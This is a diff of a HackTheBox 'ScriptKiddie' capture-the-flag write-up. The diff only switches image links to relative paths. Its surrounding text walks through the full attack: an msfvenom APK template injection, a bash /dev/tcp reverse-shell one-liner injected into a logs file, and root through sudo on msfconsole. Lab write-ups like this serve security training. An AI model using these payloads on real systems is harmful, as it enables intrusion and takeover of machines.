@@ -1,5 +1,5 @@
 # ScriptKiddie
-![banner](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/banner.png)
+![banner](src/banner.png)
 
 |Topics               |Details              |
 |:--------------------|:--------------------|
@@ -19,19 +19,19 @@ Constructive feedback is appreciated.
 ## Reconnaissance
 I started with nmap: ``nmap -sS -sC -sV 10.10.10.226``
 
-![nmap](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/nmap.png)
+![nmap](src/nmap.png)
 
 As you can see here we have two ports open. We can't hack it from it's ssh in this case, let's go with port 5000 which runs an http server through python.
 
 We see a site that runs `nmap` and `msfvenom`, let's check if it is running properly.
 
-![site](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/site.png)
+![site](src/site.png)
 
 It is working well in nmap. I also noticed something interesting in the site, a "`template file`" was required to generate reverse tcp `payloads`.
 
 Googling it up gives us more interesting things XD
 
-![site](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/search.png)
+![site](src/search.png)
 
 https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/
 
@@ -46,28 +46,28 @@ set lhost tun0 #Your VPN ip address
 set lport 2121
 run
 ```
-![msfapk](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/msfapk.png)
+![msfapk](src/msfapk.png)
 
 We got a malicious template file, we just need to move it to our working directory and set a netcat listener.
 ```bash
 mv /root/.msf4/local/msf.apk .
 nc -lvnp 2121
 ```
-![nc](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/nc.png)
+![nc](src/nc.png)
 
 Last but not least, go to http://10.10.10.226:5000 and generate a payload using our malicious template file as shown below.
 
-![payloadapkset](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/payloadapkset.png)
+![payloadapkset](src/payloadapkset.png)
 
 **Boom, we got a reverse shell as the user kid!!** (Don't forget to get your user flag XD)
 
-![payloadapkset](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/gotusershell.png)
+![payloadapkset](src/gotusershell.png)
 
 
 ## Privelege escalation to pwn user
 After a really basic enumeration, I noticed an interesting executable in /home/pwn
 
-![payloadapkset](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/nmapaspwn.png)
+![payloadapkset](src/nmapaspwn.png)
 
 As I understand so far from the code, what we put inside ``/home/kid/logs/hackers`` is executed as pwn user. Now we're going to put a reverse shell in it and get a shell as **pwn** user.
 
@@ -84,25 +84,25 @@ Don't forget to change the ip address.
 echo "  ;bash -c '0<&196;exec 196<>/dev/tcp/YOURIPHERE/2121; sh <&196 >&196 2>&196' # " > /home/kide/logs/hackers
 ```
 
-![gotshellaspwn](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/gotshellaspwn.png)
+![gotshellaspwn](src/gotshellaspwn.png)
 
 **BOOM, we got another reverse shell as pwn user!!**
 
 ## Privilege escalation to root
 Before doing any enumeration, let's check fi we can use ``sudo -l`` passwordless.
 
-![sudo-l](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/sudo-l.png)
+![sudo-l](src/sudo-l.png)
 
 This is so funny :P Just run msfconsole with sudo privileges to become root XD
 ```bash
 sudo /opt/metasploit-framework-6.0.9/msfconsole
 /bin/bash
 ```
-![root](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/Boxes/ScriptKiddie/src/root.png)
+![root](src/root.png)
 
 ***And we sucessfully pwned the machine..***
 
-![finish](https://github.com/f4T1H21/HackTheBox-Writeups/blob/main/src/finish.gif)
+![pwned](/src/gifs/pwned.gif)
 
 ## Closing
 [Click](https://app.hackthebox.eu/profile/184235) to give me respect on Hack The Box.
